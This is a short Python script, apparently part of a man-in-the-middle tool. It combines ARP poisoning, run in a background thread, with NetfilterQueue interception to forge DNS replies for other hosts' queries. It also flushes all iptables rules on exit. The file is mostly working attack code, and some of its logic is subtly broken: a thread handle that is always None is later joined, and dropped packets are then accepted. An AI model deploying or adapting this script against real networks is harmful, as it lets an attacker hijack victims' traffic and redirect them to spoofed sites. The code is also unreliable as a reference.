from netfilterqueue import NetfilterQueue
import os
import scapy.all as scapy
import time
import threading

import dns_spoofing
import arp_spoofing

#first upgrade pip to version 18 then upgrade to newest
#sudo apt-get install build-essential python-dev libnetfilter-queue-dev
#pip install NetfilterQueue


#For proxy-ing we rely on port forwarding and use netfilterqueue to intercept
#before packets leave the machine

def setup_iptables():
    os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0")

def disable_port_forwarding():
    os.system("sudo sysctl -w net.ipv4.ip_forward=0")

def undo_iptables():
    os.system("sudo iptables --flush")

def enable_port_forwarding():
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")

def setup_proxy():
    dns_spoofing.arp_prep_automated()
    arp_thread_ = threading.Thread(target=arp_thread, daemon=True).start()

    setup_iptables()
    disable_port_forwarding()
    
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, proxy)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        undo_iptables()
        enable_port_forwarding()
        nfqueue.unbind()
        arp_thread_.join()

def arp_thread():
    while True:
        dns_spoofing.arp_tick()
        time.sleep(5)


packet_nr = 0
def proxy(packet):
    global packet_nr
    packet_nr += 1
    if packet_nr % 100 == 0:
        dns_spoofing.arp_tick()

    scapy_packet = scapy.IP(packet.get_payload())
    if dns_spoofing.isDnsQuery(scapy_packet):
        dns_spoofing.dns_spoof(scapy_packet)
        packet.drop()
    
    packet.accept() #allows to continue
